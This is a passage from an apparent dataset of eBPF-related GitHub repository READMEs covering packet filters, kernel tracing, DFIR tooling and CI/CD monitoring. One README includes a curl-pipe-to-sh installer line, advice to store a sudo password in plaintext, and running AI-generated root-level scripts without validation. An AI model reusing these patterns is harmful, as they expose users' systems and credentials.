â”œâ”€â”€ Dockerfile                  # Frontend application Dockerfile
â”œâ”€â”€ eslint.config.js            # ESLint configuration
â”œâ”€â”€ index.html                  # Application entry HTML
â”œâ”€â”€ LICENSE                     # Project license
â”œâ”€â”€ modules/                    # Backend service modules
â”‚   â”œâ”€â”€ Analyzer/              # Analyzer module
â”‚   â”‚   â”œâ”€â”€ Monitor/           # Traffic monitoring sub-module
â”‚   â”‚   â”œâ”€â”€ Calculator/        # Protocol analysis sub-module
â”‚   â”‚   â””â”€â”€ README.md          # Analyzer documentation
â”‚   â”œâ”€â”€ Guarder/               # Security protection module
â”‚   â””â”€â”€ Tracer/                # Network tracing module
â”œâ”€â”€ package.json                # Node.js dependencies
â”œâ”€â”€ package-lock.json           # npm lock file
â”œâ”€â”€ pnpm-lock.yaml             # pnpm lock file
â”œâ”€â”€ src/                        # Frontend source code
â”œâ”€â”€ public/                     # Static assets
â”œâ”€â”€ README.md                   # English documentation
â”œâ”€â”€ README-zh_CN.md            # Chinese documentation
â”œâ”€â”€ SECURITY.md                # Security policy
â”œâ”€â”€ starter.sh                 # One-click deployment script
â”œâ”€â”€ tailwind.config.js         # Tailwind CSS configuration
â”œâ”€â”€ TODOList.md                # TODO list
â”œâ”€â”€ tsconfig.app.json          # TypeScript app configuration
â”œâ”€â”€ tsconfig.json              # TypeScript base configuration
â”œâ”€â”€ tsconfig.node.json         # TypeScript Node configuration
â”œâ”€â”€ vite.config.ts             # Vite build configuration
â””â”€â”€ vite-README.md             # Vite usage instructions
```

### Core Directories

- **modules/**ï¼šContains all backend service modules, each module is an independent microservice
  - **Analyzer/**ï¼šProtocol stack analysis and traffic monitoring service
  - **Guarder/**ï¼šSecurity protection and threat detection service
  - **Tracer/**ï¼šNetwork path tracing and topology analysis service
  
- **src/**ï¼šFrontend application source code, built with React and TypeScript

- **public/**ï¼šStatic asset files such as images and icons

- **starter.sh**ï¼šOne-click deployment script that automates building and starting all services


## âœ¨ Functional Modules

PacketScope consists of three main modules, each serving a specific purpose:

```
modules
â”œâ”€â”€ Analyzer  # Python-based protocol stack analysis, traffic monitoring and fine-grained tracing module
â”œâ”€â”€ Guarder   # Go-based security policy module
â””â”€â”€ Tracer    # Python-based network path mapping module
```

- **Analyzer**

  Provides multidimensional statistics on packet movement in the protocol stack, including traffic volume, latency, cross-layer interaction frequency, and packet loss. Tracks interactions of connections/packets in the protocol stack and generates a detailed visual path map. Users can click to explore different protocol layers and understand the data flow.

- **Tracer**

  Maps routes and latency from the host to any global IP address, displaying this data on a global topology for optimization insights.

- **Guarder**

  Filters and controls abnormal packets using customizable rules and provides contextual insights powered by LLMs to help interpret and respond to potential threats.

## ðŸ§° Use Cases

- **Network Protocol Stack Performance Optimization**: Identify bottlenecks and improve transmission efficiency
- **Threat Detection and Security Defense**: Detect and block potential attacks such as DDoS and ARP spoofing
- **Fault Diagnosis**: Diagnose issues caused by latency, packet loss, or abnormal cross-layer behavior
- **Topology Analysis**: Analyze path latency and routing performance in cross-regional deployments
- **Industrial Internet Security**: Monitor industrial control systems in real time to ensure safety and integrity

## â¤ï¸ Contributing

We welcome issues and pull requests! If you find bugs or have suggestions, open an issue or PR. Please refer to [CONTRIBUTING](./CONTRIBUTING.md) for contribution guidelines.

## License

This project is licensed under the MIT License. See [LICENSE](./LICENSE) for details.
"
eunomia-bpf/MCPtrace,54,4,54,1,Python,MCP server: using eBPF to tracing your kernel,2025-07-16T23:35:47Z,2025-10-02T04:22:23Z,19,"# bpftrace MCP Server: generate eBPF to trace linux kernel

A minimal MCP (Model Context Protocol) server that provides AI assistants with access to bpftrace kernel tracing capabilities.

**Now implemented in Rust** using the `rmcp` crate for better performance and type safety. The Python implementation is still available in the git history.

![bpftrace MCP Server Demo](./doc/compressed_output.gif)

## Features

- **AI-Powered Kernel Debugging**: Enable AI assistants to help you debug complex Linux kernel issues through natural language - no eBPF expertise required
- **Discover System Trace Points**: Browse and search through thousands of kernel probes to find exactly what you need to monitor - from system calls to network packets
- **Rich Context and Examples**: Access a curated collection of production-ready bpftrace scripts for common debugging scenarios like performance bottlenecks, security monitoring, and system troubleshooting
- **Secure Execution Model**: Run kernel traces safely without giving AI direct root access - MCPtrace acts as a secure gateway with proper authentication
- **Asynchronous Operation**: Start long-running traces and retrieve results later - perfect for monitoring production issues that occur intermittently
- **System Capability Detection**: Automatically discover what tracing features your kernel supports, including available helpers, map types, and probe types

## Why MCPtrace?

Debugging kernel issues traditionally requires deep eBPF expertise. MCPtrace changes that.

By bridging AI assistants with bpftrace (the perfect eBPF tracing language), MCPtrace lets you debug complex system issues through natural conversation. Just describe what you want to observe - ""show me which processes are opening files"" or ""trace slow disk operations"" - and let AI generate the appropriate kernel traces.

AI never gets root access. MCPtrace acts as a secure gateway, and with its rich collection of example scripts and probe information, AI has everything needed to help you understand what's happening inside your kernel. No eBPF expertise required.

## Installation

### Prerequisites

1. Install Rust (if not already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

2. Ensure bpftrace is installed:
```bash
sudo apt-get install bpftrace  # Ubuntu/Debian
# or
sudo dnf install bpftrace      # Fedora
```

### Install from crates.io (Recommended)

```bash
cargo install bpftrace-mcp-server
```

This will install the `bpftrace-mcp-server` binary to your Cargo bin directory (usually `~/.cargo/bin/`).

### Build from Source

Alternatively, you can build from source:

```bash
git clone https://github.com/yunwei37/MCPtrace
cd MCPtrace
cargo build --release
```

The binary will be available at `./target/release/bpftrace-mcp-server`.

### Quick Setup

Use our automated setup scripts:

- **Claude Desktop**: `./setup/setup_claude.sh`
- **Claude Code**: `./setup/setup_claude_code.sh`

For detailed setup instructions and manual configuration, see [setup/SETUP.md](./setup/SETUP.md).

## Running the Server

### If installed via cargo install
```bash
bpftrace-mcp-server
```

### If built from source
```bash
./target/release/bpftrace-mcp-server
```

### Development mode (from source)
```bash
cargo run --release
```

### Manual Configuration

For manual setup instructions for Claude Desktop or Claude Code, see [setup/SETUP.md](./setup/SETUP.md).

## Usage Examples

### List System Call Probes
```python
await list_probes(filter=""syscalls:*read*"")
```

### Get BPF System Information
```python
info = await bpf_info()
# Returns system info, kernel helpers, features, map types, and probe types
```

### Execute a Simple Trace
```python
result = await exec_program(
    'tracepoint:syscalls:sys_enter_open { printf(""%s\\n"", comm); }',
    timeout=10
)
exec_id = result[""execution_id""]
```

### Get Results
```python
output = await get_result(exec_id)
print(output[""output""])
```

## Security Notes

- The server requires sudo access for bpftrace
- **Password Handling**: Create a `.env` file with your sudo password:
  ```bash
  echo ""BPFTRACE_PASSWD=your_sudo_password"" > .env
  ```
- **Alternative**: Configure passwordless sudo for bpftrace:
  ```bash
  sudo visudo
  # Add: your_username ALL=(ALL) NOPASSWD: /usr/bin/bpftrace
  ```
- No script validation - trust the AI client to generate safe scripts
- Resource limits: 60s max execution, 10k lines buffer
- See [SECURITY.md](./SECURITY.md) for detailed security configuration

## Architecture

The Rust server uses:
- Tokio async runtime for concurrent operations
- Subprocess management for bpftrace execution
- DashMap for thread-safe in-memory buffering
- Automatic cleanup of old buffers
- rmcp crate for MCP protocol implementation

## Limitations

- No real-time streaming (use get_result to poll)
- Simple password handling (improve for production)
- No persistent storage of executions
- Basic error handling

## Documentation

- [Setup Guide](./setup/SETUP.md) - Detailed installation and configuration
- [Claude Code Setup](./setup/CLAUDE_CODE_SETUP.md) - Claude Code specific instructions
- [CLAUDE.md](./CLAUDE.md) - Development guidance for AI assistants
- [Design Document](./doc/mcp-bpftrace-design.md) - Architecture and design details

## Future Enhancements

- Add SSE transport for real-time streaming
- Implement proper authentication
- Add script validation and sandboxing
- Support for saving/loading trace sessions
- Integration with eBPF programs"
multikernel/kernelscript,271,14,271,3,OCaml,"KernelScript is a modern, type-safe, domain-specific programming language for eBPF-centric kernel customization",2025-07-14T04:08:28Z,2025-10-09T22:26:13Z,435,"![KernelScript Logo](logo.png)

# KernelScript

> **âš ï¸ Beta Version Notice**
> KernelScript is currently in beta development. The language syntax, APIs, and features are subject to change at any time without backward compatibility guarantees. This software is intended for experimental use and early feedback. Production use is not recommended at this time.

**A Domain-Specific Programming Language for eBPF-Centric Development**

KernelScript is a modern, type-safe, domain-specific programming language that unifies eBPF, userspace, and kernelspace development in a single codebase. Built with an eBPF-centric approach, it provides a clean, readable syntax while generating efficient C code for eBPF programs, coordinated userspace programs, and seamless kernel module (kfunc) integration.

KernelScript aims to become the programming language for Linux kernel customization and application-specific optimization. By leveraging kfunc and eBPF capabilities, it provides a modern alternative to traditional kernel module interfaces such as procfs and debugfs.

## Why KernelScript?

### The Problem with Current eBPF Development

Writing eBPF programs today is challenging and error-prone:

- **Raw C + libbpf**: Requires deep eBPF knowledge, extensive boilerplate code for multiple program types
- **Kernel development complexity**: Understanding eBPF verifier constraints, BPF helper functions, and kernel context
- **Kernel version compatibility**: Managing different kernel APIs, struct layouts, and available kfuncs across kernel versions
- **Complex tail call management**: Manual program array setup, explicit `bpf_tail_call()` invocation, and error handling for failed tail calls
- **Intricate dynptr APIs**: Manual management of `bpf_ringbuf_reserve_dynptr()`, `bpf_dynptr_data()`, `bpf_dynptr_write()`, and proper cleanup sequences
- **Complex struct_ops implementation**: Manual function pointer setup, intricate BTF type registration, kernel interface compliance, and lifecycle management
- **Complex kfunc implementation**: Manual kernel module creation, BTF symbol registration, export management, and module loading coordination
- **Userspace coordination**: Manually writing loaders, map management, and program lifecycle management of different kinds
- **Multiple programming paradigms**: Developers must master userspace application development, eBPF kernel programming, and kernel module (kfunc) programming

### Why Not Existing Tools?

**Why not Rust?**
- **Mixed compilation targets**: Rust's crate-wide, single-target compilation model cannot emit both eBPF bytecode and userspace binaries from one source file. KernelScript's `@xdp`, `@tc`, and regular functions compile to different targets automatically
- **No first-class eBPF program values**: Rust lacks compile-time reflection to treat functions as values with load/attach lifecycle guarantees. KernelScript's type system prevents calling `attach()` before `load()` succeeds
- **Cross-domain shared maps**: Rust's visibility and orphan rules conflict with KernelScript's implicit map sharing across programs. Safe userspace APIs for BPF maps require complex build-time generation in Rust
- **Verifier-incompatible features**: Rust's generics and complex type system often produce code rejected by the eBPF verifier. KernelScript uses fixed-width arrays (`u8[64]`) and simplified types designed for verifier compatibility
- **Error handling mismatch**: Rust's `Result<T,E>` model doesn't align with eBPF's C-style integer error codes. KernelScript's throw/catch works seamlessly in both userspace and eBPF contexts
- **Missing eBPF-specific codegen**: Rust/LLVM cannot automatically generate BPF tail calls or kernel module code for `@kfunc` attributes - features that require deep compiler integration

**Why not bpftrace?**
- Domain-specific for tracing only (no XDP, TC, etc.)
- Limited programming constructs (no complex data structures, functions)
- Interpreted at runtime rather than compiled
- No support for multi-program coordination

**Why not Python/Go eBPF libraries?**
- Still require writing eBPF programs in C
- Only handle userspace coordination, not the eBPF programs themselves
- Complex build systems and dependency management

### KernelScript's Solution

KernelScript addresses these problems through revolutionary language features:

âœ… **Single-file multi-target compilation** - Write userspace, eBPF, and kernel module code in one file. The compiler automatically targets each function correctly based on attributes (`@xdp`, `@helper`, `@kfunc`, and regular userspace functions)

âœ… **Automatic tail call orchestration** - Simply write `return other_xdp_func(ctx)` and the compiler handles program arrays, `bpf_tail_call()` generation, and error handling automatically

âœ… **Transparent dynptr integration** - Use simple pointer operations (`ringbuffer.reserve()`, `some_map[key]`) while the compiler automatically uses complex dynptr APIs (`bpf_ringbuf_reserve_dynptr`, `bpf_dynptr_write`) behind the scenes

âœ… **First-class program lifecycle safety** - Programs are typed values with compile-time guarantees that prevent calling `attach()` before `load()` succeeds

âœ… **Zero-boilerplate shared state** - Maps are automatically accessible across all programs as regular global variables in a programming language

âœ… **Builtin kfunc support** - Define full-privilege kernel functions that eBPF programs can call directly, automatically generating kernel modules and BTF registrations

âœ… **Unified error handling** - C-style integer throw/catch works seamlessly in both eBPF and userspace contexts, unlike complex Result types

âœ… **Verifier-optimized type system** - Fixed-size arrays (`u8[64]`), simple type aliases, and no complex generics that confuse the eBPF verifier

âœ… **Complete automated toolchain** - Generate ready-to-use projects with Makefiles, userspace loaders, kernel modules (if kfunc is defined) and build systems from a single source file  

âœ… **Automatic BTF extraction** - Seamlessly extract available kfuncs and kernel struct definitions from specified BTF files during project initialization


### Why Choose KernelScript?

| Feature | Raw C + libbpf | Rust eBPF | bpftrace | **KernelScript** |
|---------|---------------|-----------|----------|------------------|
| **Syntax** | Complex C | Complex Rust | Simple but limited | Clean & readable |
| **Type Safety** | Manual | Yes | Limited | Yes |
| **Multi-program** | Manual | Manual | No | Automatic |
| **Build System** | Manual Makefiles | Cargo complexity | N/A | Generated |
| **Userspace Code** | Manual | Manual | N/A | Generated |
| **Learning Curve** | Steep | Steep | Easy but limited | Moderate |
| **Program Types** | All | Most | Tracing only | All |

KernelScript combines the power of low-level eBPF programming with the productivity of modern programming languages, making eBPF development accessible to a broader audience while maintaining the performance and flexibility that makes eBPF powerful.

## Language Overview

### Program Types and Contexts

KernelScript supports all major eBPF program types with typed contexts:

```kernelscript
// XDP program for packet processing
@xdp fn packet_filter(ctx: *xdp_md) -> xdp_action {
    var packet_size = ctx->data_end - ctx->data
    var timestamp = get_current_timestamp()  // Call our custom kfunc
    
    if (packet_size > 1500) {
        return XDP_DROP
    }
    return XDP_PASS
}

// TC program for traffic control
@tc(""ingress"")
fn traffic_shaper(ctx: *__sk_buff) -> i32 {
    if (ctx->len > 1000) {
        return TC_ACT_SHOT  // Drop large packets
    }
    return TC_ACT_OK
}

// Probe for kernel function tracing
@probe fn trace_syscall(ctx: *pt_regs) -> i32 {
    // Trace system call entry
    return 0
}
```

### Type System

KernelScript has a rich type system designed for systems programming:

```kernelscript
// Type aliases for clarity
type IpAddress = u32
type Counter = u64
type PacketSize = u16

// Struct definitions
struct PacketInfo {
    src_ip: IpAddress,
    dst_ip: IpAddress,
    protocol: u8,
    size: PacketSize
}

// Enums for constants
enum FilterAction {
    ALLOW = 0,
    BLOCK = 1,
    LOG = 2
}
```

### Maps and Data Structures

Built-in support for all eBPF map types:

```kernelscript
// Pinned maps persist across program restarts
pin var connection_count : hash<IpAddress, Counter>(1024)

// Per-CPU maps for better performance
var cpu_stats : percpu_array<u32, u64>(256)

// LRU maps for automatic eviction
var recent_packets : lru_hash<IpAddress, PacketInfo>(1000)

```

### Functions and Helpers

Clean function syntax with helper function support:

```kernelscript
// Custom kernel function - runs in kernel space with full privileges
@kfunc
fn get_current_timestamp() -> u64 {
    // Access kernel-only functionality using kernel APIs
    return ktime_get_ns()  // Direct kernel API call
}

// Helper functions for eBPF programs
@helper
fn extract_src_ip(ctx: *xdp_md) -> IpAddress {
    // Packet parsing logic
    return 0x7f000001  // 127.0.0.1
}

// Regular userspace functions
fn update_stats(ip: IpAddress, size: PacketSize) {
    connection_count[ip] = connection_count[ip] + 1
}

// Function pointers for callbacks
type PacketHandler = fn(PacketInfo) -> FilterAction

fn process_packet(info: PacketInfo, handler: PacketHandler) -> FilterAction {
    return handler(info)
}
```

### Pattern Matching and Control Flow

Modern control flow with pattern matching:

```kernelscript
// Pattern matching on enums
fn handle_action(action: FilterAction) -> xdp_action {
    return match (action) {
        ALLOW: XDP_PASS,
        BLOCK: XDP_DROP,
        LOG: {
            // Log and allow
            event_log[0] = 1
            XDP_PASS
        }
    }
}

// Map lookup and update patterns
fn lookup_or_create(ip: IpAddress) -> Counter {
    var count = connection_count[ip]
    if (count != none) {
        return count  // Entry exists
    } else {
        connection_count[ip] = 1  // Create new entry
        return 1
    }
}
```

### Multi-Program Coordination

Cordination between multiple eBPF programs is just natural:

```kernelscript
// Shared map between programs
pin var shared_counter : hash<u32, u32>(1024)

// XDP program increments counter
@xdp fn packet_counter(ctx: *xdp_md) -> xdp_action {
    shared_counter[1] = shared_counter[1] + 1
    return XDP_PASS
}

// TC program reads counter
@tc(""ingress"")
fn packet_reader(ctx: *__sk_buff) -> int {
    var count = shared_counter[1]
    if (count > 1000) {
        return TC_ACT_SHOT  // Rate limiting
    }
    return TC_ACT_OK
}

// Userspace coordination
fn main() -> i32 {
    var xdp_prog = load(packet_counter)
    var tc_prog = load(packet_reader)
    
    attach(xdp_prog, ""eth0"", 0)
    attach(tc_prog, ""eth0"", 0)
    
    return 0
}
```

ðŸ“– **For detailed language specification, syntax reference, and advanced features, please read [`SPEC.md`](SPEC.md).**

ðŸ”§ **For complete builtin functions reference, see [`BUILTINS.md`](BUILTINS.md).**

## Command Line Usage

### Initialize a New Project

Create a new KernelScript project with template code:

```bash
# Create XDP project
kernelscript init xdp my_packet_filter

# Create TC project  
kernelscript init tc/egress my_traffic_shaper

# Create probe project
kernelscript init probe/sys_read my_tracer

# Create project with custom BTF path
kernelscript init --btf-vmlinux-path /custom/path/vmlinux xdp my_project

# Create XDP project with kfuncs extracted
kernelscript init --kfuncs xdp my_packet_filter

# Create struct_ops project
kernelscript init tcp_congestion_ops my_congestion_control
```

After initialization, you get:

```
my_project/
â”œâ”€â”€ my_project.ks          # Generated KernelScript source without user code
â””â”€â”€ README.md              # Usage instructions
```

**Available program types:**
- `xdp` - XDP programs for packet processing
- `tc` - Traffic control programs  
- `probe` - Kernel function probing
- `tracepoint` - Kernel tracepoint programs

**Available struct_ops:**
- `tcp_congestion_ops` - TCP congestion control


### Compile KernelScript Programs

Compile `.ks` files to eBPF C code and userspace programs:

```bash
# Basic compilation
kernelscript compile my_project/my_project.ks

# Specify output directory
kernelscript compile my_project/my_project.ks -o my_output_dir
kernelscript compile my_project/my_project.ks --output my_output_dir

# Verbose compilation
kernelscript compile my_project/my_project.ks -v
kernelscript compile my_project/my_project.ks --verbose

# Don't generate Makefile
kernelscript compile my_project/my_project.ks --no-makefile

# Also generates tests and only @test functions become main
kernelscript compile --test my_project/my_project.ks

# Custom BTF path
kernelscript compile my_project/my_project.ks --btf-vmlinux-path /custom/path/vmlinux
```

### Complete Project Structure

After compilation, you get a complete project:

```
my_project/
â”œâ”€â”€ my_project.ks          # KernelScript source
â”œâ”€â”€ my_project.c           # Generated userspace program
â”œâ”€â”€ my_project.ebpf.c      # Generated eBPF C code
â”œâ”€â”€ my_project.mod.c       # Generated kernel module (when any kfunc exists)
â”œâ”€â”€ my_project.test.c      # Generated test run code (when using --test mode)
â”œâ”€â”€ Makefile               # Build system
â””â”€â”€ README.md              # Usage instructions
```

### Build and Run

```bash
cd my_project/
make                       # Build both eBPF and userspace programs
sudo ./my_project          # Run the program
```

## Getting Started

1. **Install system dependencies (Debian/Ubuntu):**
   ```bash
   sudo apt update
   sudo apt install libbpf-dev libelf-dev zlib1g-dev opam bpftool
   ```

2. **Install KernelScript:**
   ```bash
   git clone https://github.com/multikernel/kernelscript.git
   cd kernelscript
   opam init
   opam install . --deps-only --with-test
   eval $(opam env) && dune build && dune install
   ```

3. **Create your first project:**
   ```bash
   kernelscript init xdp hello_world
   cd hello_world/
   ```

4. **Edit the generated code:**
   ```bash
   # Edit hello_world.ks with your logic
   vim hello_world.ks
   ```

5. **Compile and run:**
   ```bash
   kernelscript compile hello_world/hello_world.ks
   cd hello_world/
   make
   sudo ./hello_world
   ```

## Examples

The `examples/` directory contains comprehensive examples:

- `packet_filter.ks` - Basic XDP packet filtering
- `multi_programs.ks` - Multiple coordinated programs
- `maps_demo.ks` - All map types and operations
- `functions.ks` - Function definitions and calls
- `types_demo.ks` - Type system features
- `error_handling_demo.ks` - Error handling patterns

## License

Copyright 2025 Multikernel Technologies, Inc.

Licensed under the Apache License, Version 2.0 (the ""License"");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed un"
markopetrovi/eBPFLuanti,6,1,6,1,C,eBPF Luanti (Minetest) packet filter,2025-07-12T13:42:02Z,2025-09-04T03:22:32Z,60,"---

# Luanti eBPF Network Filters

This repository contains high-performance eBPF/XDP programs and a companion management tool designed to protect **Luanti** (formerly Minetest) servers from packet-based abuse, such as UDP spam and flooding.

eBPF (extended Berkeley Packet Filter) is a Linux kernel technology that allows loading verified, sandboxed programs directly into the kernel for safe, high-performance packet filtering. These programs can be JIT-compiled to native code for minimal latency while maintaining kernel stability.

---

## Included Programs

* **`xdp_filter`** â€“ Filters and bans IPs that send too many UDP â€œinitâ€ packets matching the Luanti protocol format.
* **`eBPFtool`** â€“ A standalone command-line utility (no libbpf needed) for managing watched ports, bans, and logs.

---

## Features

* âš¡ **High-performance**: Runs at the XDP layer for minimal latency and maximum throughput.
* ðŸš« **Dynamic IP banning**: Automatically blocks abusive IPs.
* ðŸ” **Auto-reset tracking**: Resets per-IP counters after a period of inactivity.
* ðŸŽ¯ **Port filtering**: Only inspects packets sent to explicitly watched ports.
* ðŸ›  **Self-contained management tool**: Uses raw `SYS_bpf` syscallsâ€”no extra libraries required.
* ðŸ“œ **Detailed ban records**: Timestamps, duration, last seen port, and reason.
* ðŸ“‚ **Structured logs**: `fetch_logs` outputs a JSON array of `ban_record` entries for easy parsing.

---

## Program Logic (xdp\_filter)

The program detects and rate-limits UDP init packets:

* **Protocol ID**: `0x4f457403`
* **Peer ID**: `0x0000` (inexistent)
* **Threshold**: More than 100 packets in 10 seconds from the same IP âž ban

### Data Structures (Maps)

| Map Name        | Type     | Key             | Value               | Purpose                         |
| --------------- | -------- | --------------- | ------------------- | ------------------------------- |
| `packet_count`  | LRU Hash | `u32` IP        | `struct ip_entry`   | Tracks packet count + timestamp |
| `records`       | Queue    | â€”               | `struct ban_record` | Ban event log queue             |
| `banned_ips`    | Hash     | `u32` IP        | `struct ban_entry`  | Stores current bans             |
| `watched_ports` | Hash     | `u16` port      | `u8`                | Ports to inspect for filtering  |

---

## Build and Usage

### 1. Build

```sh
make vmlinux   # Generates vmlinux.h for the eBPF program
make           # Compiles the management tool and the eBPF program
```

### 2. Load / Unload the Filter

> Loading/unloading is still done with the `ip` command.

```sh
sudo ip link set dev enp0s6 xdp obj xdp_filter.o sec xdp
sudo ip link set dev enp0s6 xdp off
```

### 3. Manage with eBPFtool

```sh
./eBPFtool --help
```

**Main commands:**

* `dump_ports` â€“ List watched ports
* `add_port <port>` / `rm_port <port>` â€“ Add/remove watched ports
* `ban <port> <ip> <duration> <reason>` â€“ Manually ban an IP
* `unban <ip>` â€“ Unban an IP
* `list_bans` â€“ Show current bans
* `is_banned <ip>` - Check if an IP is currently banned
* `fetch_logs` â€“ Output a JSON array of `ban_record` entries from expired bans and the log queue

---

## Requirements

* Linux kernel with eBPF/XDP support (relatively recent version recommended)
* `clang`, `gcc`, `make`, `bpftool`
* Root privileges to load eBPF programs

---

## License

MIT License

---
"
capelabs/ebpf-for-dfir,13,0,13,0,C,"A lightweight, extensible forensic tool that leverages eBPF to collect real-time system events on Windows for Digital Forensics and Incident Response.",2025-04-12T12:56:18Z,2025-09-15T07:26:37Z,9,"# eBPF-for-DFIR

eBPF-for-DFIR is an open-source tool that uses eBPF (Extended Berkeley Packet Filter) technology to collect real-time system data for Digital Forensics and Incident Response (DFIR) on Windows systems. By leveraging the eBPF-for-Windows framework, it provides deep visibility into system activity and helps incident responders gather crucial information during investigations.

## Features
* Real-Time Data Collection: Captures system data in real time from Windows machines.

* Windows Integration: Built on top of eBPF-for-Windows, enabling detailed data collection on Windows.

* DFIR-Focused: Designed for Digital Forensics and Incident Response to provide key insights during security investigations.

## Requirements
* Windows Operating System: The tool is designed for use on Windows environments. (Windows 10 or later, Windows Server 2019 or later)

* [eBPF-for-Windows](https://github.com/microsoft/ebpf-for-windows): The tool relies on the eBPF framework for Windows to capture system events.

Please refer to this [setup document](docs/setup.md) for detailed configuration.

## Deep-dive
This tool extends eBPF-for-Windows by monitoring key system activities for DFIR:

* FileEventEbpfExt: Monitors file system events, detecting file creation, modification, and deletion.

* RegEventEbpfExt: Tracks registry modifications, providing insight into registry key changes.

* ProcEventEbpfExt: Monitors process execution, including process creation and termination.

* NetEventEbpfExt: Captures network-related events such as connections and data transmissions.

## Example Projects

The `examples/` directory contains user-level projects that demonstrate how to receive eBPF data and output it to the console. These examples show how to interact with the eBPF-for-DFIR extensions from user space, making it easier to collect and display real-time system activity for DFIR purposes.

- **process_collector**: Receives process-related eBPF events and prints them to the console. This project illustrates how to subscribe to process creation and termination events, and how to format and display this information for analysis.

These examples can be used as a reference for building your own user-level tools that consume eBPF data on Windows.

## Future works
* MutexEventEbpfExt: Monitors the creation of mutex objects to track synchronization events in the system.

* ProcEventEbpfExt: Extended to monitor DLL loading, image loading, and memory mapping in the system.

## Extending features
If ebpf-for-dfir does not support the features you need, you can extend the tool by following the [guide](docs/extension.md). We also welcome and appreciate your contributions!

## Contribution
We welcome contributions! Feel free to submit issues, feature requests, or pull requests.

## License
This project is licensed under the MIT License. See the LICENSE file for details.
"
isovalent/CKS-Study-Guide,110,10,110,0,,Certified Kubernetes Security Specialist (CKS) Study Guide,2025-04-30T12:14:45Z,2025-10-09T17:48:28Z,8,"# Certified Kubernetes Security Specialist Study Guide for Cilium

[![License: CC BY-NC 4.0](https://img.shields.io/badge/License-CC_BY--NC_4.0-lightgrey.svg)](LICENSE)
![audit ebee](files/audit-bee.png)

Recent updates to the CNCF's  Certified Kubernetes Security Specialist (CKS) Exam introduced Cilium for certain domains and competencies. This study guide aims to help the candidates prepare for the domain and competencies specific to Cilium in the CKS exam. 

## About the Certification

You can find everything you need about the Certification on its official [page](https://training.linuxfoundation.org/certification/certified-kubernetes-security-specialist/).

### Cluster Setup â€“ 15%

Topic

- Use Network security policies to restrict cluster-level access

Resources

- [Getting Started with Cilium - Lab ðŸ¥¼](https://isovalent.com/labs/cilium-getting-started/?journey=security)
- [Identity Based - Cilium Docs ðŸ“–](https://docs.cilium.io/en/stable/security/network/identity/)
- [Network Policy Use Cases ðŸ“–](https://cilium.io/use-cases/network-policy/)
- [From IP to identity: making cattle out of pets in cloud native ðŸ“–](https://www.cncf.io/blog/2023/07/24/from-ip-to-identity-making-cattle-out-of-pets-in-cloud-native/)
- [Zero Trust Security with Cilium ðŸ“–](https://isovalent.com/blog/post/zero-trust-security-with-cilium/)
- [Network Policy - Cilium Docs ðŸ“–](https://www.google.com/url?q=https://docs.cilium.io/en/latest/security/policy/&sa=D&source=docs&ust=1752587154689176&usg=AOvVaw3jXm8N7S5nAp45QDng9Olg)
- [Policy Enforcement Mode - Cilium Docs ðŸ“–](https://docs.cilium.io/en/latest/security/policy/intro/)
- [eCHO Episode 43: Deep dive on FQDN Policy ðŸ“º](https://www.youtube.com/watch?v=iJ98HRZi8hM)
- [Network Policy Editor (Check out the tutorial section of the editor)ðŸ¥¼](https://editor.networkpolicy.io/)
- [Cilium Host FirewallðŸ¥¼](https://isovalent.com/labs/cilium-host-firewall/?journey=security)
- [Using Kubernetes Constructs In PolicyðŸ“–](https://docs.cilium.io/en/latest/security/policy/kubernetes/)

### Minimize Microservice Vulnerabilities Domain â€“ 20%

Topic

- Implement Pod-to-Pod encryption using (Cilium, Istio)

Resources

- [Transparent Encryption Usecase ðŸ“–](https://cilium.io/use-cases/transparent-encryption/)
- [Tutorial: Transparent Encryption with IPsec and WireGuard](https://isovalent.com/blog/post/tutorial-transparent-encryption-with-ipsec-and-wireguard/)
- [eCHO Episode 79: Transparent Encryption with IPsec and WireGuardðŸ“º](https://www.youtube.com/watch?v=vj7M-t9MK6s)
- [Cilium Transparent Encryption with IPsec and WireGuardðŸ“º](https://www.youtube.com/watch?v=RAmJXsMeACU)
- [Cilium Transparent Encryption with IPSec and WireGuard - Lab ðŸ¥¼](https://isovalent.com/labs/cilium-transparent-encryption-with-ipsec-and-wireguard/?journey=security)
- [Transparent Encryption -  docs ðŸ“–](https://docs.cilium.io/en/stable/security/network/encryption/#gsg-encryption)

### Additional Resource

- [KillerCoda CKS  Cilium environmentðŸ¥¼](https://killercoda.com/killer-shell-cks/scenario/playground-cilium)
"
appsec-jedi/pipeline-sentinel,7,0,7,0,C,,2025-06-22T13:31:39Z,2025-10-01T16:27:37Z,29,"# Pipeline Sentinel

**A lightweight, eBPF-powered security monitor for CI/CD build pipelines.**

**[Read the Full Research Paper](./docs/Pipeline_Sentinel_Research_Paper.pdf)**

[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/appsec-jedi/pipeline-sentinel/actions)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

Pipeline Sentinel provides real-time visibility into the build phase of CI/CD pipelines, detecting and blocking suspicious process executions to protect against supply chain attacks.

## The Problem: The CI/CD Blind Spot

Modern CI/CD pipelines are a prime target for attackers. The build step often pulls and executes code from dozens of third-party dependencies, creating a significant but often unmonitored attack surface. Malicious packages or compromised build tools can execute arbitrary commands inside your trusted environment to steal secrets, inject backdoors, or pivot to other internal systems.

Traditional security tools like SAST and artifact scanning analyze your code *before* or *after* the build, leaving the build phase itself a critical blind spot.

## The Solution: Real-time Behavioral Monitoring

Pipeline Sentinel addresses this gap by monitoring the build environment in real-time. It uses modern kernel technology to watch every process as it's created, matching its behavior against a flexible rule set to identify threats.

### Key Features

* **Kernel-Level Visibility via eBPF:** Uses eBPF to safely and efficiently monitor all new process executions (`execve` syscall) with near-zero performance overhead.
* **Intelligent Analysis in Go:** A high-performance Go agent enriches kernel events with full command-line arguments and applies custom detection logic.
* **Flexible YAML Rule Engine:** Detections are driven by a simple `rules.yaml` file, allowing users to easily define suspicious patterns, from single commands to complex, multi-part command strings.
* **CI/CD Integration:** Fully containerized with Docker and designed to run as a service container in pipelines like GitHub Actions, with the ability to automatically fail a build when a critical threat is found.

## Architecture

The tool is composed of two main components:

1. **eBPF Probe (C):** A minimal, safe program that runs in the Linux kernel to capture process events.
2. **User-space Agent (Go):** A concurrent Go application that receives events from the kernel, reads the full command line from `/proc`, matches events against the rule set, and generates alerts.

```mermaid
flowchart LR
